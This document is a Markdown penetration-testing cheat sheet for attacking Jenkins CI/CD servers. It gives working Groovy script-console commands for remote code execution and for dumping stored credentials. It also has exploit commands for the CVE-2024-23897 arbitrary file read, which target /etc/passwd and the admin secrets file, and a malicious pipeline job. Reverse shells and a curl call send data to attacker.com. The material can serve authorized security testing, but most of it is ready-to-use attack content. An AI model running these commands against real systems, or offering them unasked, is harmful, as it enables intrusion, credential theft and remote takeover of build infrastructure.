# Jenkins Security Testing

## Overview
Security testing for Jenkins CI/CD installations including authentication bypass, RCE, and credential exposure.

## Reconnaissance
```
# Default Jenkins ports
:8080 (default), :443, :80

# Version detection
GET /
# Look for: "Jenkins ver. X.Y.Z" in response

# API endpoint
GET /api/json?pretty=true → list jobs, views
GET /api/xml

# Check login page
/login
/j_spring_security_check
```

## Authentication Bypass

### No Authentication (Anonymous Access)
```
# Try accessing without login:
GET /api/json?pretty=true
GET /asynchPeople/api/json → list users
GET /computer/api/json → list nodes

# If Jenkins allows anonymous read → information disclosure
# If anonymous has build trigger → RCE
```

### Default Credentials
```
admin:admin, admin:password, jenkins:jenkins
# Check for setup wizard completion (first-run)
GET /setupWizard/ → if accessible, initial admin password may be shown

# Initial admin password location:
/var/jenkins_home/secrets/initialAdminPassword
/var/lib/jenkins/secrets/initialAdminPassword
```

### Script Console (Groovy RCE)
```
# If authenticated (or auth bypass):
# Navigate to: /script → Groovy Script Console

# RCE via Groovy:
println "id".execute().text
println "cat /etc/passwd".execute().text
println ["bash", "-c", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"].execute().text

# List files:
println new File('/').list()

# Read file:
println new File('/var/jenkins_home/secrets/initialAdminPassword').text

# Credentials dump:
import com.cloudbees.plugins.credentials.*
def creds = com.cloudbees.plugins.credentials.CredentialsProvider.lookupCredentials(
    com.cloudbees.plugins.credentials.common.StandardUsernameCredentials.class,
    Jenkins.instance, null, null)
creds.each { println it.username + ":" + it.password }
```

## Unauthenticated RCE (CVE-2019-1003000 Series)
```
# Check version against CVE database
# Jenkins < 2.138 has multiple critical RCEs

# CVE-2019-1003000: Script Security bypass
# CVE-2018-1000861: Remote code execution
# CVE-2024-23897: Arbitrary file read via CLI
```

## Arbitrary File Read (CVE-2024-23897)
```
# Jenkins CLI allows file read via @file argument
# @/path/to/file in command argument reads local file

java -jar jenkins-cli.jar -s http://target:8080/ help "@/var/jenkins_home/secrets/initialAdminPassword"
java -jar jenkins-cli.jar -s http://target:8080/ help "@/etc/passwd"
java -jar jenkins-cli.jar -s http://target:8080/ connect-node "@/etc/passwd"

# Via HTTP (no CLI jar needed):
POST /cli?remoting=false HTTP/1.1
# Body contains CLI command with @file reference
```

## Credential Exposure
```
# credentials.xml contains encrypted credentials
GET /credentials/store/system/domain/_/credential/CRED_ID/config.xml
# May expose encrypted passwords, SSH keys, API tokens

# Via Groovy console:
import com.cloudbees.plugins.credentials.*
def resolver = Jenkins.instance.getDescriptorByType(
    com.cloudbees.jenkins.plugins.awscredentials.AWSCredentialsImpl.DescriptorImpl)
```

## Pipeline/Job Injection
```
# If can create/modify jobs:
# Pipeline script RCE
pipeline {
    agent any
    stages {
        stage('Test') {
            steps {
                sh 'curl attacker.com/`id`'
            }
        }
    }
}

# Or via Freestyle project → Execute Shell:
bash -i >& /dev/tcp/attacker.com/4444 0>&1
```

## SSRF via Jenkins
```
# Jenkins has many external service integrations
# Git plugin: can make requests to internal services
# Webhook triggers: SSRF via callback URLs
# Update center URL: if configurable
```

## Jenkins API Abuse
```
# Trigger builds via API (if authenticated or anon allowed)
POST /job/JOB_NAME/build
POST /job/JOB_NAME/buildWithParameters?PARAM=VALUE

# With crumb (CSRF token):
GET /crumbIssuer/api/json → get crumb
POST /job/JOB_NAME/build -H "Jenkins-Crumb: CRUMB"
```

## Testing Methodology
1. Detect Jenkins and identify version
2. Test anonymous access (/api/json, /asynchPeople/, /computer/)
3. Test default credentials
4. Check for CVE-2024-23897 (arbitrary file read)
5. If auth access: test Script Console
6. Check exposed credentials.xml
7. Test for unauthenticated build triggering
8. Check SSRF via build configurations
9. Review job pipeline scripts for injection

## Tools
- `nuclei -t jenkins/` templates
- Jenkins CLI jar for CVE-2024-23897
- Burp Suite for auth testing
- Metasploit Jenkins modules
